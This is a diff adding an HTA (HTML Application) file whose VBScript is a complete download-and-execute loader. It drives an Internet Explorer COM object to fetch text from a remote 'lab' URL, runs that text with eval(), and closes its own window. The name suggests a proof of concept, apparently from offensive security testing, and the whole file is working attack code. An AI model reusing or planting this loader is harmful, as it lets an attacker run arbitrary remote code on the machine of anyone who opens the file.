@@ -1,0 +1,38 @@
+<head>
+<HTA:APPLICATION>
+</head>
+<script language="VBScript">
+
+Set objIE = CreateObject("InternetExplorer.Application")
+objIE.Navigate2 "https://dumpco.re/lab/calc-vbs.html", 14
+
+counts = 0
+
+Function f()
+    If objIE.Busy Then
+        counts = counts + 1
+
+        If counts > 30 Then
+            objIE.Stop()
+            counts = 0
+        Else
+            a = window.setTimeout("f", 1000, "VBScript")
+        End If
+    Else
+        response = objIE.Document.Body.InnerText
+
+        eval(response)
+
+        objIE.Stop()
+        counts = 0
+       
+        document.close
+        Window.Close
+    End If    
+End Function
+
+f()
+
+</script>
+<body>
+</body>
